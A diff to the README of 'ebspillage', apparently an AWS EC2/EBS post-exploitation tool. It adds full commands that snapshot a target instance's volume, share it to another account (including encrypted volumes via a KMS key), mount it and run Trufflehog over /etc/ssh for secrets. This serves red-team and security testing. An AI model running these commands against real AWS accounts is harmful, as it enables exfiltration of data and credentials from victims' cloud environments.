@@ -4,7 +4,7 @@ This is an EC2 EBS post-exploitation script. The end goal is to make your life a
 
 ## Features
 - **Snapshot Creation**: Create snapshots of the root EBS volume of an EC2 instance.
-- **Cross-Account Snapshot Transfer**: Optionally transfer the snapshot to a different AWS account.
+- **Cross-Account Snapshot Transfer**: Optionally modify snapshot permissions to allow transfer of the snapshot to a different AWS account. 
 - **Volume Creation**: Create a new volume from the snapshot and attach it to a target EC2 instance.
 - **Volume Mounting**: Mount the created volume to a specified EC2 instance for inspection.
 - **Trufflehog Scanning**: Run Trufflehog on the mounted volume to search for secrets.
@@ -26,6 +26,13 @@ This scenario involves creating a snapshot in one AWS account, transferring it t
 
 ```
 python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-062fb4910e81569b1 --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json --transfer
+```
+
+### Cross-Account Abuse with Encrypted EBS 
+Requires knowing the KMS key used to encrypt the volume. Creates and transfers the snapshot, handling decryption / reencryption for you. 
+
+```
+python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-062fb4910e81569b1 --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json --transfer --kms-key-id arn:aws:kms:us-east-1:123456789012:key/abcd1234-56ef-78gh-90ij-klmn1234opqr
 ```
 
 ## Arguments
@@ -121,7 +128,9 @@ This command will delete all EC2 instances, EBS volumes, and snapshots in the sp
 - [x] Fix bug where the mount host's own filesystem gets mounted rather than the target ec2 
 - [x] Fix issue where snapshot transfer is failing 
 - [x] Unmount volume from ec2 mount host after trufflehog completes 
-- [ ] Fix error where volume doesn't get detached from mount host after trufflehog run
+- [x] Fix error where volume doesn't get detached from mount host after trufflehog run
+- [ ] Ensure snapshots are deleted in destination account when transferring 
+- [ ] Ensure snapshots are deleted when not doing cross-account snapshot transfer 
 
 ## To Do
 - [ ] Run tests with encrypted EBS volumes with various roles / AuthZ levels 
